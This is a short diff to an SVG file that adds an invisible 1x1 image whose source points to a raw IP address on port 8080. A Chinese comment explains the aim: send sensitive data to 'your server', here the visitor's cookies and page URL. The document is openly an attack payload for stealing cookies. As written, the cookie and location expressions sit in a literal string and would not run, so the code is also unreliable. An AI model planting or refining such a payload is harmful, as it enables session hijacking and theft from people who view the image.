@@ -2,7 +2,7 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
   <!-- 关键：用<image>的src指向你的服务器，参数拼敏感数据 -->
   <image 
-    src="https://sunwayc.github.io/1.php?cookie=document.cookie&page=window.location.href" 
+    src="http://43.139.224.94:8080/1.php?cookie=document.cookie&page=window.location.href" 
     width="1" 
     height="1"
   />
